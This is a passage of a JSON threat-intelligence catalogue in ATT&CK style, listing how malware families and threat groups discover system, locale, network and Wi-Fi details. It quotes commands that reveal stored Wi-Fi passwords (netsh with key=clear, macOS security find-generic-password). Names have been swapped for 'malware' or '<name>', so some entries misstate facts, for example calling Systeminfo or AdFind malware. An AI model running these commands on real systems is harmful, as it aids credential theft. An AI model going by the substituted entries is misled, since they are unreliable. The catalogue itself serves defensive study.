                "Description": "malware has the ability to enumerate system information including the victim computer name.[361][362][363]"
            },
            "S0627": {
                "ID": "S0627",
                "Name": "SodaMaster",
                "Description": "malware can enumerate the host name and OS version on a target system.[364]"
            },
            "C0024": {
                "ID": "C0024",
                "Name": "SolarWinds Compromise",
                "Description": "During the malware, APT29 used fsutil to check available free space before executing actions that might create large files on disk.[365]"
            },
            "S0615": {
                "ID": "S0615",
                "Name": "SombRAT",
                "Description": "malware can execute getinfo to enumerate the computer name and OS version of a compromised system.[366]"
            },
            "S0516": {
                "ID": "S0516",
                "Name": "SoreFang",
                "Description": "malware can collect the hostname, operating system configuration, product ID, and disk space on victim machines by executing Systeminfo.[367]"
            },
            "S0157": {
                "ID": "S0157",
                "Name": "SOUNDBITE",
                "Description": "malware is capable of gathering system information.[206]"
            },
            "G0054": {
                "ID": "G0054",
                "Name": "Sowbug",
                "Description": "malware obtained OS version and hardware configuration from a victim.[368]"
            },
            "S0543": {
                "ID": "S0543",
                "Name": "Spark",
                "Description": "malware can collect the hostname, keyboard layout, and language from the system.[369]"
            },
            "S0374": {
                "ID": "S0374",
                "Name": "SpeakUp",
                "Description": "malware uses the cat /proc/cpuinfo | grep -c \"cpu family\" 2>&1 command to gather system information. [370]"
            },
            "S0646": {
                "ID": "S0646",
                "Name": "SpicyOmelette",
                "Description": "malware can identify the system name of a compromised host.[371]"
            },
            "S1030": {
                "ID": "S1030",
                "Name": "Squirrelwaffle",
                "Description": "malware has gathered victim computer information and configurations.[372]"
            },
            "S0058": {
                "ID": "S0058",
                "Name": "SslMM",
                "Description": "malware sends information to its hard-coded C2, including OS version, service pack information, processor speed, system name, and OS install date.[373]"
            },
            "S1037": {
                "ID": "S1037",
                "Name": "STARWHALE",
                "Description": "malware can gather the computer name of an infected host.[374][375]"
            },
            "G0038": {
                "ID": "G0038",
                "Name": "Stealth Falcon",
                "Description": "malware malware gathers system information via WMI, including the system directory, build number, serial number, version, manufacturer, model, and total physical memory.[376]"
            },
            "S0380": {
                "ID": "S0380",
                "Name": "StoneDrill",
                "Description": "malware has the capability to discover the system OS, Windows version, architecture and environment.[377]"
            },
            "S0142": {
                "ID": "S0142",
                "Name": "StreamEx",
                "Description": "malware has the ability to enumerate system information.[378]"
            },
            "S1034": {
                "ID": "S1034",
                "Name": "StrifeWater",
                "Description": "malware can collect the OS version, architecture, and machine name to create a unique token for the infected host.[379]"
            },
            "S0491": {
                "ID": "S0491",
                "Name": "StrongPity",
                "Description": "malware can identify the hard disk volume serial number on a compromised host.[380]"
            },
            "S0603": {
                "ID": "S0603",
                "Name": "Stuxnet",
                "Description": "malware collects system information including computer and domain names, OS version, and S7P paths.[381]"
            },
            "S0559": {
                "ID": "S0559",
                "Name": "SUNBURST",
                "Description": "malware collected hostname and OS version.[382][383]"
            },
            "S1064": {
                "ID": "S1064",
                "Name": "SVCReady",
                "Description": "malware has the ability to collect information such as computer name, computer manufacturer, BIOS, operating system, and firmware, including through the use of systeminfo.exe.[384]"
            },
            "S0242": {
                "ID": "S0242",
                "Name": "SynAck",
                "Description": "malware gathers computer names, OS version info, and also checks installed keyboard layouts to estimate if it has been launched from a certain list of countries.[385]"
            },
            "S0060": {
                "ID": "S0060",
                "Name": "Sys10",
                "Description": "malware collects the computer name, OS versioning information, and OS install date and sends the information to the C2.[373]"
            },
            "S0464": {
                "ID": "S0464",
                "Name": "SYSCON",
                "Description": "malware has the ability to use Systeminfo to identify system information.[87]"
            },
            "S0096": {
                "ID": "S0096",
                "Name": "Systeminfo",
                "Description": "malware can be used to gather information about the operating system.[386]"
            },
            "S0663": {
                "ID": "S0663",
                "Name": "SysUpdate",
                "Description": "malware can collect a system's architecture, operating system version, hostname, and drive information.[387][388]"
            },
            "S0098": {
                "ID": "S0098",
                "Name": "T9000",
                "Description": "malware gathers and beacons the operating system build number and CPU Architecture (32-bit/64-bit) during installation.[389]"
            },
            "G1018": {
                "ID": "G1018",
                "Name": "TA2541",
                "Description": "malware has collected system information prior to downloading malware on the targeted host.[390]"
            },
            "S0586": {
                "ID": "S0586",
                "Name": "TAINTEDSCRIBE",
                "Description": "malware can use DriveList to retrieve drive information.[391]"
            },
            "S0467": {
                "ID": "S0467",
                "Name": "TajMahal",
                "Description": "malware has the ability to identify hardware information, the computer name, and OS information on an infected host.[392]"
            },
            "G0139": {
                "ID": "G0139",
                "Name": "TeamTNT",
                "Description": "malware has searched for system version, architecture, disk partition, logical volume, and hostname information.[393][394]"
            },
            "S0665": {
                "ID": "S0665",
                "Name": "ThreatNeedle",
                "Description": "malware can collect system profile information from a compromised host.[395]"
            },
            "G1022": {
                "ID": "G1022",
                "Name": "ToddyCat",
                "Description": "malware has collected information on bootable drives including model, vendor, and serial numbers.[268]"
            },
            "S0678": {
                "ID": "S0678",
                "Name": "Torisma",
                "Description": "malware can use GetlogicalDrives to get a bitmask of all drives available on a compromised system. It can also use GetDriveType to determine if a new drive is a CD-ROM drive.[396]"
            },
            "S0266": {
                "ID": "S0266",
                "Name": "TrickBot",
                "Description": "malware gathers the OS version, machine name, CPU type, amount of RAM available, and UEFI/BIOS firmware information from the victim\u2019s machine.[397][398][399][400]"
            },
            "S0094": {
                "ID": "S0094",
                "Name": "Trojan.Karagany",
                "Description": "malware can capture information regarding the victim's OS, security, and hardware configuration.[401]"
            },
            "G0081": {
                "ID": "G0081",
                "Name": "Tropic Trooper",
                "Description": "malware has detected a target system\u2019s OS version and system volume information.[402][403]"
            },
            "S0647": {
                "ID": "S0647",
                "Name": "Turian",
                "Description": "malware can retrieve system information including OS version, memory usage, local hostname, and system adapter information.[404]"
            },
            "G0010": {
                "ID": "G0010",
                "Name": "Turla",
                "Description": "malware surveys a system upon check-in to discover operating system configuration details using the systeminfo and set commands.[405][406]"
            },
            "S0199": {
                "ID": "S0199",
                "Name": "TURNEDUP",
                "Description": "malware is capable of gathering system information.[407]"
            },
            "S0263": {
                "ID": "S0263",
                "Name": "TYPEFRAME",
                "Description": "malware can gather the disk volume information.[408]"
            },
            "S0130": {
                "ID": "S0130",
                "Name": "Unknown Logger",
                "Description": "malware can obtain information about the victim computer name, physical memory, country, and date.[409]"
            },
            "S0275": {
                "ID": "S0275",
                "Name": "UPPERCUT",
                "Description": "malware has the capability to gather the system\u2019s hostname and OS version.[410]"
            },
            "S0022": {
                "ID": "S0022",
                "Name": "Uroburos",
                "Description": "malware has the ability to gather basic system information and run the POSIX API gethostbyname.[411]"
            },
            "S0386": {
                "ID": "S0386",
                "Name": "Ursnif",
                "Description": "malware has used Systeminfo to gather system information.[412]"
            },
            "S0476": {
                "ID": "S0476",
                "Name": "Valak",
                "Description": "malware can determine the Windows version and computer name on a compromised host.[413][414]"
            },
            "S0257": {
                "ID": "S0257",
                "Name": "VERMIN",
                "Description": "malware collects the OS name, machine name, and architecture information.[415]"
            },
            "S0180": {
                "ID": "S0180",
                "Name": "Volgmer",
                "Description": "malware can gather system information, the computer name, OS version, drive and serial information from the victim's machine.[416][417][418]"
            },
            "G1017": {
                "ID": "G1017",
                "Name": "Volt Typhoon",
                "Description": "malware has discovered file system types, drive names, size, and free space on compromised systems.[419][420][421]"
            },
            "S0670": {
                "ID": "S0670",
                "Name": "WarzoneRAT",
                "Description": "malware can collect compromised host information, including OS version, PC name, RAM size, and CPU details.[422]"
            },
            "S0514": {
                "ID": "S0514",
                "Name": "WellMess",
                "Description": "malware can identify the computer name of a compromised host.[423][424]"
            },
            "S0689": {
                "ID": "S0689",
                "Name": "WhisperGate",
                "Description": "malware has the ability to enumerate fixed logical drives on a targeted system.[425]"
            },
            "G0124": {
                "ID": "G0124",
                "Name": "Windigo",
                "Description": "malware has used a script to detect which Linux distribution and version is currently installed on the system.[71]"
            },
            "S0155": {
                "ID": "S0155",
                "Name": "WINDSHIELD",
                "Description": "malware can gather the victim computer name.[206]"
            },
            "G0112": {
                "ID": "G0112",
                "Name": "Windshift",
                "Description": "malware has used malware to identify the computer name of a compromised host.[426]"
            },
            "S0219": {
                "ID": "S0219",
                "Name": "WINERACK",
                "Description": "malware can gather information about the host.[165]"
            },
            "S0176": {
                "ID": "S0176",
                "Name": "Wingbird",
                "Description": "malware checks the victim OS version after executing to determine where to drop files based on whether the victim is 32-bit or 64-bit.[427]"
            },
            "S0059": {
                "ID": "S0059",
                "Name": "WinMM",
                "Description": "malware collects the system name, OS version including service pack, and system install date and sends the information to the C2 server.[373]"
            },
            "S0141": {
                "ID": "S0141",
                "Name": "Winnti for Windows",
                "Description": "malware can determine if the OS on a compromised host is newer than Windows XP.[428]"
            },
            "G0102": {
                "ID": "G0102",
                "Name": "Wizard Spider",
                "Description": "malware has used Systeminfo and similar commands to acquire detailed configuration information of a victim's machine. malware has also utilized the PowerShell cmdlet Get-ADComputer to collect DNS hostnames, last logon dates, and operating system information from Active Directory.[429][430]"
            },
            "S1065": {
                "ID": "S1065",
                "Name": "Woody RAT",
                "Description": "malware can retrieve the following information from an infected machine: OS, architecture, computer name, OS build version, environment variables, and storage drives.[431]"
            },
            "S0161": {
                "ID": "S0161",
                "Name": "XAgentOSX",
                "Description": "malware contains the getInstalledAPP function to run ls -la /Applications to gather what applications are installed.[432]"
            },
            "S0658": {
                "ID": "S0658",
                "Name": "XCSSET",
                "Description": "malware identifies the macOS version and uses ioreg to determine serial number.[433]"
            },
            "S0388": {
                "ID": "S0388",
                "Name": "YAHOYAH",
                "Description": "malware checks for the system\u2019s Windows OS version and hostname.[402]"
            },
            "S0248": {
                "ID": "S0248",
                "Name": "yty",
                "Description": "malware gathers the computer name, the serial number of the main disk volume, CPU information, Microsoft Windows version, and runs the command systeminfo.[434]"
            },
            "S0251": {
                "ID": "S0251",
                "Name": "Zebrocy",
                "Description": "malware collects the OS version, computer name and serial number for the storage volume C:. malware also runs the systeminfo command to gather system information. [435][82][436][83][437][438][439]"
            },
            "S0230": {
                "ID": "S0230",
                "Name": "ZeroT",
                "Description": "malware gathers the victim's computer name, Windows version, and system language, and then sends it to its C2 server.[440]"
            },
            "S0330": {
                "ID": "S0330",
                "Name": "Zeus Panda",
                "Description": "malware collects the OS version, system architecture, computer name, product ID, install date, and information on the keyboard mapping to determine the language used on the system.[441][442]"
            },
            "G0128": {
                "ID": "G0128",
                "Name": "ZIRCONIUM",
                "Description": "malware has used a tool to capture the processor architecture of a compromised host in order to register it with C2.[443]"
            },
            "S0086": {
                "ID": "S0086",
                "Name": "ZLib",
                "Description": "malware has the ability to enumerate system information.[245]"
            },
            "S0672": {
                "ID": "S0672",
                "Name": "Zox",
                "Description": "malware can enumerate attached drives.[444]"
            },
            "S0350": {
                "ID": "S0350",
                "Name": "zwShell",
                "Description": "malware can obtain the victim PC name and OS version.[445]"
            },
            "S0412": {
                "ID": "S0412",
                "Name": "ZxShell",
                "Description": "malware can collect the local hostname, operating system details, CPU speed, and total physical memory.[446]"
            },
            "S1013": {
                "ID": "S1013",
                "Name": "ZxxZ",
                "Description": "malware has collected the host name and operating system product name from a compromised machine.[447]"
            }
        }
    },
    "T1614": {
        "ttp_name": "System Location Discovery",
        "ttp_id": "T1614",
        "href": "/techniques/T1614",
        "subtechnique": {
            "001": {
                "name": "System Language Discovery",
                "href": "/techniques/T1614/001",
                "description": "Adversaries may attempt to gather information about the system language of a victim in order to infer the geographical location of that host. This information may be used to shape follow-on behaviors, including whether the adversary infects the target and/or attempts specific actions. This decision may be employed by malware developers and operators to reduce their risk of attracting the attention of specific law enforcement agencies or prosecution/scrutiny from other entities.[1]There are various sources of data an adversary could use to infer system language, such as system defaults and keyboard layouts. Specific checks will vary based on the target and/or adversary, but may involve behaviors such as Query Registry and calls to Native API functions.[2] For example, on a Windows system adversaries may attempt to infer the language of a system by querying the registry key HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language or parsing the outputs of Windows API functions GetUserDefaultUILanguage, GetSystemDefaultUILanguage, GetKeyboardLayoutList and GetUserDefaultLangID.[3][4][5]On a macOS or Linux system, adversaries may query locale to retrieve the value of the $LANG environment variable.",
                "Procedure": {
                    "S0640": {
                        "ID": "S0640",
                        "Name": "Avaddon",
                        "Description": "<name> checks for specific keyboard layouts and OS languages to avoid targeting Commonwealth of Independent States (CIS) entities.[6]"
                    },
                    "S0534": {
                        "ID": "S0534",
                        "Name": "Bazar",
                        "Description": "<name> can perform a check to ensure that the operating system's keyboard and language settings are not set to Russian.[7]"
                    },
                    "S0611": {
                        "ID": "S0611",
                        "Name": "Clop",
                        "Description": "<name> has checked the keyboard language using the GetKeyboardLayout() function to avoid installation on Russian-language or other Commonwealth of Independent States-language machines; it will also check the GetTextCharset function.[8]"
                    },
                    "S0625": {
                        "ID": "S0625",
                        "Name": "Cuba",
                        "Description": "<name> can check if Russian language is installed on the infected machine by using the function GetKeyboardLayoutList.[9]"
                    },
                    "S0616": {
                        "ID": "S0616",
                        "Name": "DEATHRANSOM",
                        "Description": "Some versions of <name> have performed language ID and keyboard layout checks; if either of these matched Russian, Kazakh, Belarusian, Ukrainian or Tatar <name> would exit.[10]"
                    },
                    "S0547": {
                        "ID": "S0547",
                        "Name": "DropBook",
                        "Description": "<name> has checked for the presence of Arabic language in the infected machine's settings.[11]"
                    },
                    "S0696": {
                        "ID": "S0696",
                        "Name": "Flagpro",
                        "Description": "<name> can check whether the target system is using Japanese, Taiwanese, or English through detection of specific Windows Security and Internet Explorer dialog.[12]"
                    },
                    "S0632": {
                        "ID": "S0632",
                        "Name": "GrimAgent",
                        "Description": "<name> has used Accept-Language to identify hosts in the United Kingdom, United States, France, and Spain.[13]"
                    },
                    "G0004": {
                        "ID": "G0004",
                        "Name": "Ke3chang",
                        "Description": "<name> has used implants to collect the system language ID of a compromised machine.[14]"
                    },
                    "G1026": {
                        "ID": "G1026",
                        "Name": "Malteiro",
                        "Description": "<name> will terminate Mispadu's infection process if the language of the victim machine is not Spanish or Portuguese.[15]"
                    },
                    "S0652": {
                        "ID": "S0652",
                        "Name": "MarkiRAT",
                        "Description": "<name> can use the GetKeyboardLayout API to check if a compromised host's keyboard is set to Persian.[16]"
                    },
                    "S0449": {
                        "ID": "S0449",
                        "Name": "Maze",
                        "Description": "<name> has checked the language of the machine with function GetUserDefaultUILanguage and terminated execution if the language matches with an entry in the predefined list.[17]"
                    },
                    "S0083": {
                        "ID": "S0083",
                        "Name": "Misdat",
                        "Description": "<name> has attempted to detect if a compromised host had a Japanese keyboard via the Windows API call GetKeyboardType.[18]"
                    },
                    "S1122": {
                        "ID": "S1122",
                        "Name": "Mispadu",
                        "Description": "<name> checks and will terminate execution if the compromised system\u2019s language ID is not Spanish or Portuguese.[19][15]"
                    },
                    "S0691": {
                        "ID": "S0691",
                        "Name": "Neoichor",
                        "Description": "<name> can identify the system language on a compromised host.[14]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "During <name>, Lazarus Group deployed malware designed not to run on computers set to Korean, Japanese, or Chinese in Windows language preferences.[20]"
                    },
                    "S0496": {
                        "ID": "S0496",
                        "Name": "REvil",
                        "Description": "<name> can check the system language using GetUserDefaultUILanguage and GetSystemDefaultUILanguage. If the language is found in the list, the process terminates.[21]"
                    },
                    "S0446": {
                        "ID": "S0446",
                        "Name": "Ryuk",
                        "Description": "<name> has been observed to query the registry key HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language and the value InstallLanguage. If the machine has the value 0x419 (Russian), 0x422 (Ukrainian), or 0x423 (Belarusian), it stops execution.[2]"
                    },
                    "S0085": {
                        "ID": "S0085",
                        "Name": "S-Type",
                        "Description": "<name> has attempted to determine if a compromised system was using a Japanese keyboard via the GetKeyboardType API call.[18]"
                    },
                    "S0546": {
                        "ID": "S0546",
                        "Name": "SharpStage",
                        "Description": "<name>  has been used to target Arabic-speaking users and used code that checks if the compromised machine has the Arabic language installed.[11]"
                    },
                    "S0543": {
                        "ID": "S0543",
                        "Name": "Spark",
                        "Description": "<name> has checked the results of the GetKeyboardLayoutList and the language name returned by GetLocaleInfoA to make sure they contain the word \"Arabic\" before executing.[22]"
                    },
                    "S0242": {
                        "ID": "S0242",
                        "Name": "SynAck",
                        "Description": "<name> lists all the keyboard layouts installed on the victim\u2019s system using GetKeyboardLayoutList API and checks against a hardcoded language code list. If a match if found, <name> sleeps for 300 seconds and then exits without encrypting files.[5]"
                    },
                    "S0658": {
                        "ID": "S0658",
                        "Name": "XCSSET",
                        "Description": "<name> uses AppleScript to check the host's language and location with the command user locale of (get system info).[23]"
                    },
                    "S0330": {
                        "ID": "S0330",
                        "Name": "Zeus Panda",
                        "Description": "<name> queries the system's keyboard mapping to determine the language used on the system. It will terminate execution if it detects LANG_RUSSIAN, LANG_BELARUSIAN, LANG_KAZAK, or LANG_UKRAINIAN.[24]"
                    }
                }
            }
        },
        "tactic": "Discovery",
        "description": "Adversaries may gather information in an attempt to calculate the geographical location of a victim host. Adversaries may use the information from System Location Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Adversaries may attempt to infer the location of a system using various system checks, such as time zone, keyboard layout, and/or language settings.[1][2][3] Windows API functions such as GetLocaleInfoW can also be used to determine the locale of the host.[1] In cloud environments, an instance's availability zone may also be discovered by accessing the instance metadata service from the instance.[4][5]Adversaries may also attempt to infer the location of a victim host using IP addressing, such as via online geolocation IP-lookup services.[6][2]",
        "Procedure": {
            "S1025": {
                "ID": "S1025",
                "Name": "Amadey",
                "Description": "malware does not run any tasks or install additional malware if the victim machine is based in Russia.[7]"
            },
            "S0115": {
                "ID": "S0115",
                "Name": "Crimson",
                "Description": "malware can identify the geographical location of a victim host.[8]"
            },
            "S1111": {
                "ID": "S1111",
                "Name": "DarkGate",
                "Description": "malware queries system locale information during execution.[9] Later versions of malware query GetSystemDefaultLCID for locale information to determine if the malware is executing in Russian-speaking countries.[10]"
            },
            "S0673": {
                "ID": "S0673",
                "Name": "DarkWatchman",
                "Description": "malware can identity the OS locale of a compromised host.[11]"
            },
            "S0632": {
                "ID": "S0632",
                "Name": "GrimAgent",
                "Description": "malware can identify the country code on a compromised host.[12]"
            },
            "S0262": {
                "ID": "S0262",
                "Name": "QuasarRAT",
                "Description": "malware can determine the country a victim host is located in.[13]"
            },
            "S0481": {
                "ID": "S0481",
                "Name": "Ragnar Locker",
                "Description": "Before executing malicious code, malware checks the Windows API GetLocaleInfoW and doesn't encrypt files if it finds a former Soviet country.[1]"
            },
            "S1018": {
                "ID": "S1018",
                "Name": "Saint Bot",
                "Description": "malware has conducted system locale checks to see if the compromised host is in Russia, Ukraine, Belarus, Armenia, Kazakhstan, or Moldova.[14][15]"
            },
            "S0461": {
                "ID": "S0461",
                "Name": "SDBbot",
                "Description": "malware can collected the country code of a compromised machine.[16]"
            },
            "G1008": {
                "ID": "G1008",
                "Name": "SideCopy",
                "Description": "malware has identified the country location of a compromised host.[17]"
            },
            "S1124": {
                "ID": "S1124",
                "Name": "SocGholish",
                "Description": "malware can use IP-based geolocation to limit infections to victims in North America, Europe, and a small number of Asian-Pacific nations.[18]"
            }
        }
    },
    "T1016": {
        "ttp_name": "System Network Configuration Discovery",
        "ttp_id": "T1016",
        "href": "/techniques/T1016",
        "subtechnique": {
            "001": {
                "name": "Internet Connection Discovery",
                "href": "/techniques/T1016/001",
                "description": "Adversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as using Ping, tracert, and GET requests to websites.Adversaries may use the results and responses from these requests to determine if the system is capable of communicating with their C2 servers before attempting to connect to them. The results may also be used to identify routes, redirectors, and proxy servers.",
                "Procedure": {
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has ensured web servers in a victim environment are Internet accessible before copying tools or malware to it.[1]"
                    },
                    "S1066": {
                        "ID": "S1066",
                        "Name": "DarkTortilla",
                        "Description": "<name> can check for internet connectivity by issuing HTTP GET requests.[2]"
                    },
                    "G1016": {
                        "ID": "G1016",
                        "Name": "FIN13",
                        "Description": "<name> has used Ping and tracert for network reconnaissance efforts.[3]"
                    },
                    "G0061": {
                        "ID": "G0061",
                        "Name": "FIN8",
                        "Description": "<name> has used the Ping command to check connectivity to actor-controlled C2 servers.[4]"
                    },
                    "G0047": {
                        "ID": "G0047",
                        "Name": "Gamaredon Group",
                        "Description": "<name> has tested connectivity between a compromised machine and a C2 server using  Ping with commands such as CSIDL_SYSTEM\\cmd.exe /c ping -n 1.[5]"
                    },
                    "S0597": {
                        "ID": "S0597",
                        "Name": "GoldFinder",
                        "Description": "<name> performed HTTP GET requests to check internet connectivity and identify HTTP proxy servers and other redirectors that an HTTP request traveled through.[6]"
                    },
                    "G0125": {
                        "ID": "G0125",
                        "Name": "HAFNIUM",
                        "Description": "<name> has checked for network connectivity from a compromised host using ping, including attempts to contact google[.]com.[7]"
                    },
                    "G1001": {
                        "ID": "G1001",
                        "Name": "HEXANE",
                        "Description": "<name> has used tools including BITSAdmin to test internet connectivity from compromised hosts.[8]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has conducted a network call out to a specific website as part of their initial discovery activity.[9]"
                    },
                    "S0284": {
                        "ID": "S0284",
                        "Name": "More_eggs",
                        "Description": "<name> has used HTTP GET requests to check internet connectivity.[10]"
                    },
                    "S0691": {
                        "ID": "S0691",
                        "Name": "Neoichor",
                        "Description": "<name> can check for Internet connectivity by contacting bing[.]com with the request format bing[.]com?id=<GetTickCount>.[11]"
                    },
                    "S1107": {
                        "ID": "S1107",
                        "Name": "NKAbuse",
                        "Description": "<name> utilizes external services such as ifconfig.me to identify the victim machine's IP address.[12]"
                    },
                    "C0014": {
                        "ID": "C0014",
                        "Name": "Operation Wocao",
                        "Description": "During <name>, threat actors used a Visual Basic script that checked for internet connectivity.[13]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> can measure the download speed on a targeted host.[14]"
                    },
                    "S0686": {
                        "ID": "S0686",
                        "Name": "QuietSieve",
                        "Description": "<name> can check C2 connectivity with a ping to 8.8.8.8 (Google public DNS).[15]"
                    },
                    "S0448": {
                        "ID": "S0448",
                        "Name": "Rising Sun",
                        "Description": "<name> can test a connection to a specified network IP address over a specified port number.[16]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 used GoldFinder to perform HTTP GET requests to check internet connectivity and identify HTTP proxy servers and other redirectors that an HTTP request travels through.[6]"
                    },
                    "S1049": {
                        "ID": "S1049",
                        "Name": "SUGARUSH",
                        "Description": "<name> has checked for internet connectivity from an infected host before attempting to establish a new TCP connection.[17]"
                    },
                    "S0663": {
                        "ID": "S0663",
                        "Name": "SysUpdate",
                        "Description": "<name> can contact the DNS server operated by Google as part of its C2 establishment process.[18]"
                    },
                    "G1018": {
                        "ID": "G1018",
                        "Name": "TA2541",
                        "Description": "<name> has run scripts to check internet connectivity from compromised hosts. [19]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> has used tracert to check internet connectivity.[20]"
                    },
                    "S1065": {
                        "ID": "S1065",
                        "Name": "Woody RAT",
                        "Description": "<name> can make Ping GET HTTP requests to its C2 server at regular intervals for network connectivity checks.[21]"
                    }
                }
            },
            "002": {
                "name": "Wi-Fi Discovery",
                "href": "/techniques/T1016/002",
                "description": "Adversaries may search for information about Wi-Fi networks, such as network names and passwords, on compromised systems. Adversaries may use Wi-Fi information as part of Account Discovery, Remote System Discovery, and other discovery or Credential Access activity to support both ongoing and future campaigns.Adversaries may collect various types of information about Wi-Fi networks from hosts. For example, on Windows names and passwords of all Wi-Fi networks a device has previously connected to may be available through netsh wlan show profiles to enumerate Wi-Fi names and then netsh wlan show profile \"Wi-Fi name\" key=clear to show a Wi-Fi network\u2019s corresponding password.[1][2][3] Additionally, names and other details of locally reachable Wi-Fi networks can be discovered using calls to wlanAPI.dll Native API functions.[4]On Linux, names and passwords of all Wi-Fi-networks a device has previously connected to may be available in files under /etc/NetworkManager/system-connections/.[5] On macOS, the password of a known Wi-Fi may be identified with security find-generic-password -wa wifiname (requires admin username/password).[6]",
                "Procedure": {
                    "S0331": {
                        "ID": "S0331",
                        "Name": "Agent Tesla",
                        "Description": "<name> can collect names and passwords of all Wi-Fi networks to which a device has previously connected.[7]"
                    },
                    "S0367": {
                        "ID": "S0367",
                        "Name": "Emotet",
                        "Description": "<name> can extract names of all locally reachable Wi-Fi networks and then perform a brute-force attack to spread to new networks.[4]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has collected names and passwords of all Wi-Fi networks to which a device has previously connected.[3]"
                    }
                }
            }
        },
        "tactic": "Discovery",
        "description": "Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.Adversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. show ip route, show ip interface).[1][2]Adversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.",
        "Procedure": {
            "S1028": {
                "ID": "S1028",
                "Name": "Action RAT",
                "Description": "malware has the ability to collect the MAC address of an infected host.[3]"
            },
            "S0552": {
                "ID": "S0552",
                "Name": "AdFind",
                "Description": "malware can extract subnet information from Active Directory.[4][5][6]"
            },
            "G0018": {
                "ID": "G0018",
                "Name": "admin@338",
                "Description": "malware actors used the following command after exploiting a machine with LOWBALL malware to acquire information about local networks: ipconfig /all >> %temp%\\download[7]"
            },
            "S0331": {
                "ID": "S0331",
                "Name": "Agent Tesla",
                "Description": "malware can collect the IP address of the victim machine and spawn instances of netsh.exe to enumerate wireless settings.[8][9]"
            },
            "S0092": {
                "ID": "S0092",
                "Name": "Agent.btz",
                "Description": "malware collects the network adapter\u2019s IP and MAC address as well as IP addresses of the network adapter\u2019s default gateway, primary/secondary WINS, DHCP, and DNS servers, and saves them into a log file.[10]"
            },
            "S1025": {
                "ID": "S1025",
                "Name": "Amadey",
                "Description": "malware can identify the IP address of a victim machine.[11]"
            },
            "S0504": {
                "ID": "S0504",
                "Name": "Anchor",
                "Description": "malware can determine the public IP and location of a compromised host.[12]"
            },
            "S0622": {
                "ID": "S0622",
                "Name": "AppleSeed",
                "Description": "malware can identify the IP of a targeted system.[13]"
            },
            "G0006": {
                "ID": "G0006",
                "Name": "APT1",
                "Description": "malware used the ipconfig /all command to gather network configuration information.[14]"
            },
            "G0073": {
                "ID": "G0073",
                "Name": "APT19",
                "Description": "malware used an HTTP malware variant and a Port 22 malware variant to collect the MAC address and IP address from the victim\u2019s machine.[15]"
            },
            "G0022": {
                "ID": "G0022",
                "Name": "APT3",
                "Description": "A keylogging tool used by malware gathers network information from the victim, including the MAC address, IP address, WINS, DHCP server, and gateway.[16][17]"
            },
            "G0050": {
                "ID": "G0050",
                "Name": "APT32",
                "Description": "malware used the ipconfig /all command to gather the IP address from the system.[18]"
            },
            "G0096": {
                "ID": "G0096",
                "Name": "APT41",
                "Description": "malware collected MAC addresses from victim machines.[19][20]"
            },
            "S0456": {
                "ID": "S0456",
                "Name": "Aria-body",
                "Description": "malware has the ability to identify the location, public IP address, and domain name on a compromised host.[21]"
            },
            "S0099": {
                "ID": "S0099",
                "Name": "Arp",
                "Description": "malware can be used to display ARP configuration information on the host.[22]"
            },
            "S0373": {
                "ID": "S0373",
                "Name": "Astaroth",
                "Description": "malware collects the external IP address from the system. [23]"
            },
            "S0640": {
                "ID": "S0640",
                "Name": "Avaddon",
                "Description": "malware can collect the external IP address of the victim.[24]"
            },
            "S0473": {
                "ID": "S0473",
                "Name": "Avenger",
                "Description": "malware can identify the domain of the compromised host.[25]"
            },
            "S0344": {
                "ID": "S0344",
                "Name": "Azorult",
                "Description": "malware can collect host IP information from the victim\u2019s machine.[26]"
            },
            "S0414": {
                "ID": "S0414",
                "Name": "BabyShark",
                "Description": "malware has executed the ipconfig /all command.[27]"
            },
            "S0093": {
                "ID": "S0093",
                "Name": "Backdoor.Oldrea",
                "Description": "malware collects information about the Internet adapter configuration.[28][29]"
            },
            "S0245": {
                "ID": "S0245",
                "Name": "BADCALL",
                "Description": "malware collects the network adapter information.[30]"
            },
            "S0642": {
                "ID": "S0642",
                "Name": "BADFLICK",
                "Description": "malware has captured victim IP address details.[31]"
            },
            "S0234": {
                "ID": "S0234",
                "Name": "Bandook",
                "Description": "malware has a command to get the public IP address from a system.[32]"
            },
            "S0534": {
                "ID": "S0534",
                "Name": "Bazar",
                "Description": "malware can collect the IP address and NetBIOS name of an infected machine.[33]"
            },
            "S0268": {
                "ID": "S0268",
                "Name": "Bisonal",
                "Description": "malware can execute ipconfig on the victim\u2019s machine.[34][35][36]"
            },
            "S0089": {
                "ID": "S0089",
                "Name": "BlackEnergy",
                "Description": "malware has gathered information about network IP configurations using ipconfig.exe and about routing tables using route.exe.[37][38]"
            },
            "S0520": {
                "ID": "S0520",
                "Name": "BLINDINGCAN",
                "Description": "malware has collected the victim machine's local IP address information and MAC address.[39]"
            },
            "S0657": {
                "ID": "S0657",
                "Name": "BLUELIGHT",
                "Description": "malware can collect IP information from the victim\u2019s machine.[40]"
            },
            "S0486": {
                "ID": "S0486",
                "Name": "Bonadan",
                "Description": "malware can find the external IP address of the infected host.[41]"
            },
            "S0651": {
                "ID": "S0651",
                "Name": "BoxCaon",
                "Description": "malware can collect the victim's MAC address by using the GetAdaptersInfo API.[42]"
            },
            "S0252": {
                "ID": "S0252",
                "Name": "Brave Prince",
                "Description": "malware gathers network configuration information as well as the ARP cache.[43]"
            },
            "C0015": {
